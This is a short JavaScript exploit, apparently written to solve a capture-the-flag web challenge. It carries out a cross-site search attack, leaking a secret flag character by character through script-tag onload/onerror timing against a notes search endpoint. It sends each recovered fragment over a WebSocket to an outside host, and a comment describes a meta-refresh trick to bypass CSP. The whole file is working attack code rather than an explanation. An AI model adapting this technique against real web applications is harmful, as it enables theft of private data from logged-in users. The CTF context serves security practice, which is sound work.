// meta-refresh to bypass CSP <meta http-equiv="refresh" content="0;url=http://jmy.li/scratchpad">

const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
        doExploit();
});

const sleep = d => new Promise(r => setTimeout(r, d));

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

async function search(content) {
        return new Promise(r => {
                let searchScript = document.createElement('script');
        searchScript.src = 'http://scratchpad.hackable.software:3000/notes?q=' + encodeURI(content);
        document.head.appendChild(searchScript);
        searchScript.onload = () => {
            r(true);
        }
        searchScript.onerror = () => {
            r(false);
        }
        });
}

async function doExploit() {
    const searchSpace = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!=,.[]$?&'.split('');
    let currentString = 'DrgnS{NoSameSiteCookiesByDefaul';
    let continueSearching = true;

    log('[*] Searching has now begun');
    while(continueSearching){
        continueSearching = false;
        for(let c of searchSpace){
            const res = await search(currentString + c);
            if(res){
                currentString += c;
                continueSearching = true;
                log('[*] Found content: ' + currentString);
                break;
            }
        }
    }
}
